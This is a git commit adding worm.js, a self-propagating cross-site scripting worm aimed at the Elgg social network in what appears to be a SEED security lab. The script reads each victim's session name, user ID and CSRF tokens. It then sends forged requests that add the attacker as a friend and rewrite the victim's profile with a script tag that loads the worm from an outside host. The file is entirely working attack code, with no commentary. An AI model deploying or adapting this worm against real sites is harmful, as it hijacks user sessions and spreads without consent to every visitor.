04fd6bd947a1187c06aaaf1097c8d398db10a218
Zachary-E-Hamilton <110483229+Zachary-E-Hamilton@users.noreply.github.com>
2024-03-31 02:49:13 -0400

    Add files via upload

---
+++ worm.js
@@ -0,0 +1,29 @@
+window.onload = function(){
+
+    var wormCode = "<script src='http://www.example.com/xxs_worm.js'></script>";
+    var userName = "&name=" + elgg.session.user.name;
+    var guid = "&guid=" + elgg.session.user.guid;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+
+    var friendUrl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
+    var description = "&description=" + encodeURIComponent(wormCode);
+    var content = token + ts + userName + description + guid;
+
+    var samyGuid = 59;
+    var editUrl = "http://www.seed-server.com/action/profile/edit";
+
+    if(elgg.session.user.guid != samyGuid) {
+        var Ajax = null;
+
+        Ajax = new XMLHttpRequest();
+        Ajax.open("GET", friendUrl, true);
+        Ajax.send();
+
+
+        Ajax = new XMLHttpRequest();
+        Ajax.open("POST", editUrl, true);
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+    }
+};
